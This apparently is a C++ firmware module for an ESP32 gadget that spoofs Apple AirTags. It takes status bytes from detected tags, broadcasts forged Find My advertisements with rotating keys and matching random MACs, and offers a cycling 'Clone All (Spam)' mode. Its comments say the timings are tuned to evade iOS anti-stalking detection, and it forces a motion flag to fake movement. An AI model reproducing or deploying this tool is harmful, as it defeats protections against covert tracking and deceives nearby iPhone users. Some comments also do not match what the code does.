/*
doomBOX by Richard Gladson
https://github.com/RichardGladson/doomBOX
Copyright (c) 2026 Richard Gladson
Licensed under the GNU General Public License v3.0
SPDX-License-Identifier: GPL-3.0-only
*/
#include "../include/airtag_spoofer.h"
#include "../include/radio_manager.h"
#include "../include/airtag_detector.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/setting.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "esp_rom_sha.h" // For hardware SHA256 (MAC sync and key derivation)

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern std::vector<AirTagDeviceData> airtagDevices;

#define BTN_UP BUTTON_PIN_UP
#define BTN_DOWN BUTTON_PIN_DOWN
#define BTN_RIGHT BUTTON_PIN_RIGHT
#define BTN_BACK BUTTON_PIN_LEFT
#define BTN_CENTER BUTTON_PIN_CENTER

enum AirTagSpooferState { SPOOFER_MENU, SPOOFER_CLONE_SELECT, SPOOFER_CLONE_RUNNING, SPOOFER_CLONE_ALL_RUNNING };
static AirTagSpooferState currentState = SPOOFER_MENU;
static bool bleInitialized = false;
static int menuSelection = 0;
static int cloneTargetIndex = 0;
static bool isAdvertising = false;
static unsigned long lastAdvertiseTime = 0;
static int currentCloneAllIndex = 0;
static unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;
static bool needsRedraw = true;
static AirTagSpooferState lastState = SPOOFER_MENU;

// Crypto state for Apple device evasion
static uint8_t masterKey[32];
static uint8_t currentPublicKey[22];
static uint32_t keyEpoch = 0;
static unsigned long lastKeyRotation = 0;
const unsigned long KEY_ROTATION_INTERVAL = 900000; // 15 minutes (matches real AirTag)

// FIXED: Realistic advertising interval (1 to 2 seconds). 
// 0x20-0x40 (20-40ms) triggers iOS anti-stalking heuristics instantly.
static esp_ble_adv_params_t adv_params = {
    .adv_int_min        = 0x640, // ~1000ms
    .adv_int_max        = 0xC80, // ~2000ms
    .adv_type           = ADV_TYPE_NONCONN_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// Derive the next public key using SHA256(MasterKey || Epoch)
void deriveNextKey() {
    esp_rom_sha256_ctx_t ctx;
    esp_rom_sha256_init(&ctx);
    esp_rom_sha256_starts(&ctx);
    esp_rom_sha256_data(&ctx, masterKey, 32);
    
    uint8_t epochBytes[4] = { 
        (uint8_t)((keyEpoch >> 24) & 0xFF), 
        (uint8_t)((keyEpoch >> 16) & 0xFF), 
        (uint8_t)((keyEpoch >> 8) & 0xFF), 
        (uint8_t)(keyEpoch & 0xFF) 
    };
    esp_rom_sha256_data(&ctx, epochBytes, 4);
    
    uint8_t hash[32];
    esp_rom_sha256_finish(&ctx, hash);
    memcpy(currentPublicKey, hash, 22); // First 22 bytes become the public key
    keyEpoch++;
}

// Synchronize the BLE MAC address to the current public key
void syncMACtoKey() {
    esp_rom_sha256_ctx_t ctx;
    esp_rom_sha256_init(&ctx);
    esp_rom_sha256_starts(&ctx);
    esp_rom_sha256_data(&ctx, currentPublicKey, 22);
    
    uint8_t hash[32];
    esp_rom_sha256_finish(&ctx, hash);
    
    esp_bd_addr_t newMac;
    memcpy(newMac, hash, 6);
    newMac[0] |= 0xC0; // Set locally administered and random bits
    esp_ble_gap_set_rand_addr(newMac);
}

// Rebuild the Find My payload with the current key and status
void buildFindMyPayload(uint8_t *outPayload, uint8_t &outLen, uint8_t targetStatusByte) {
    outPayload[0] = 0x1E;       // Length
    outPayload[1] = 0xFF;       // Manufacturer Specific Data
    outPayload[2] = 0x4C;       // Apple Company ID (Little Endian)
    outPayload[3] = 0x00;
    outPayload[4] = 0x12;       // Find My service type
    // Force motion bit (0x10) if the target was moving, or just set it to 0x1E to simulate active movement
    outPayload[5] = targetStatusByte | 0x10; 
    memcpy(&outPayload[6], currentPublicKey, 22);
    outLen = 28;
}

void initializeAdvertising() {
    if (!bleInitialized) {
        initBLE();
        bleInitialized = true;
    }
    // Generate a random master key on first boot
    if (keyEpoch == 0) {
        for (int i = 0; i < 32; i++) masterKey[i] = (uint8_t)(esp_random() & 0xFF);
        deriveNextKey();
        lastKeyRotation = millis();
    }
}

void startSingleClone() {
    if (airtagDevices.empty() || isAdvertising) return;
    initializeAdvertising();
    
    auto &device = airtagDevices[cloneTargetIndex];
    esp_ble_gap_stop_advertising();
    delay(10);

    // Check if we need to rotate the key (every 15 mins)
    if (millis() - lastKeyRotation > KEY_ROTATION_INTERVAL) {
        deriveNextKey();
        lastKeyRotation = millis();
    }

    // 1. Sync MAC to the current rotated key
    syncMACtoKey();
    
    // 2. Build the payload with the rotated key and target's status byte
    uint8_t advPayload[31];
    uint8_t advLen = 0;
    buildFindMyPayload(advPayload, advLen, device.statusByte);
    
    esp_ble_gap_config_adv_data_raw(advPayload, advLen);
    delay(10);
    esp_ble_gap_start_advertising(&adv_params);
    isAdvertising = true;
    lastAdvertiseTime = millis();
}

void startCloneAllSpam() {
    if (airtagDevices.empty()) return;
    currentCloneAllIndex = 0;
    cloneTargetIndex = 0;
    startSingleClone();
}

void stopAdvertising() {
    if (!isAdvertising) return;
    esp_ble_gap_stop_advertising();
    delay(5);
    isAdvertising = false;
}

void airtagSpooferSetup() {
    menuSelection = 0;
    cloneTargetIndex = 0;
    currentCloneAllIndex = 0;
    isAdvertising = false;
    lastButtonPress = 0;
    currentState = SPOOFER_MENU;
    bleInitialized = false;
    needsRedraw = true;
    lastState = SPOOFER_MENU;
    keyEpoch = 0; // Reset crypto state on setup

    u8g2.begin();
    u8g2.setFont(u8g2_font_6x10_tr);
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    pinMode(BTN_CENTER, INPUT_PULLUP);
}

void airtagSpooferLoop() {
    unsigned long now = millis();
    if (currentState != lastState) {
        lastState = currentState;
        needsRedraw = true;
    }

    static bool upPressed = false, downPressed = false;
    static bool rightPressed = false, leftPressed = false;
    bool upNow = digitalRead(BTN_UP) == LOW;
    bool downNow = digitalRead(BTN_DOWN) == LOW;
    bool rightNow = digitalRead(BTN_CENTER) == LOW;
    bool leftNow = digitalRead(BTN_BACK) == LOW;

    switch (currentState) {
    case SPOOFER_MENU:
        if (!airtagDevices.empty()) {
            if (upNow && !upPressed) { menuSelection = (menuSelection - 1 + 2) % 2; needsRedraw = true; delay(200); }
            if (downNow && !downPressed) { menuSelection = (menuSelection + 1) % 2; needsRedraw = true; delay(200); }
            if (rightNow && !rightPressed) {
                if (menuSelection == 0) { currentState = SPOOFER_CLONE_SELECT; needsRedraw = true; }
                else { startCloneAllSpam(); currentState = SPOOFER_CLONE_ALL_RUNNING; needsRedraw = true; }
                delay(200);
            }
        }
        if (needsRedraw) {
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 12, "AirTag Spoofer");
            if (airtagDevices.empty()) {
                u8g2.drawStr(0, 28, "No AirTags found!");
                u8g2.drawStr(0, 44, "Run Detector first");
            } else {
                const char* items[] = { "Clone Target", "Clone All (Spam)" };
                for (int i = 0; i < 2; i++) {
                    char itemStr[32];
                    snprintf(itemStr, sizeof(itemStr), "%s %s", menuSelection == i ? ">" : " ", items[i]);
                    u8g2.drawStr(0, 28 + i * 16, itemStr);
                }
            }
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawStr(0, 62, "U/D=NAV SEL=OK L=Back");
            u8g2.sendBuffer(); displayMirrorSend(u8g2);
            needsRedraw = false;
        }
        break;

    case SPOOFER_CLONE_SELECT:
        if (upNow && !upPressed) { cloneTargetIndex = (cloneTargetIndex - 1 + airtagDevices.size()) % airtagDevices.size(); needsRedraw = true; delay(200); }
        if (downNow && !downPressed) { cloneTargetIndex = (cloneTargetIndex + 1) % airtagDevices.size(); needsRedraw = true; delay(200); }
        if (rightNow && !rightPressed) { startSingleClone(); currentState = SPOOFER_CLONE_RUNNING; needsRedraw = true; delay(200); }
        if (leftNow && !leftPressed) { currentState = SPOOFER_MENU; needsRedraw = true; delay(200); }
        if (needsRedraw) {
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 12, "Select Target");
            auto &t = airtagDevices[cloneTargetIndex];
            char buf[32];
            snprintf(buf, sizeof(buf), "%d/%d", cloneTargetIndex + 1, (int)airtagDevices.size());
            u8g2.drawStr(0, 28, buf);
            snprintf(buf, sizeof(buf), "Addr: %.17s", t.address);
            u8g2.drawStr(0, 44, buf);
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawStr(0, 62, "U/D=Scroll SEL=Start L=Back");
            u8g2.sendBuffer(); displayMirrorSend(u8g2);
            needsRedraw = false;
        }
        break;

    case SPOOFER_CLONE_RUNNING:
    case SPOOFER_CLONE_ALL_RUNNING:
        if (leftNow && !leftPressed) {
            stopAdvertising();
            currentState = (currentState == SPOOFER_CLONE_RUNNING) ? SPOOFER_CLONE_SELECT : SPOOFER_MENU;
            needsRedraw = true; delay(200);
        }
        
        // Restart advertising to apply key rotations or cycle targets
        if (isAdvertising && now - lastAdvertiseTime > 2000) {
            stopAdvertising(); delay(5);
            if (currentState == SPOOFER_CLONE_ALL_RUNNING) {
                currentCloneAllIndex = (currentCloneAllIndex + 1) % airtagDevices.size();
                cloneTargetIndex = currentCloneAllIndex;
            }
            startSingleClone();
        }
        
        if (needsRedraw) {
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 12, "Spoofing Active");
            u8g2.setFont(u8g2_font_5x8_tr);
            char buf[32];
            snprintf(buf, sizeof(buf), "Epoch: %lu", keyEpoch);
            u8g2.drawStr(0, 30, buf);
            u8g2.drawStr(0, 44, "MAC Synced to Key");
            u8g2.drawStr(0, 62, "L=Back");
            u8g2.sendBuffer(); displayMirrorSend(u8g2);
            needsRedraw = false;
        }
        break;
    }

    upPressed = upNow; downPressed = downNow; rightPressed = rightNow; leftPressed = leftNow;
    delay(5);
}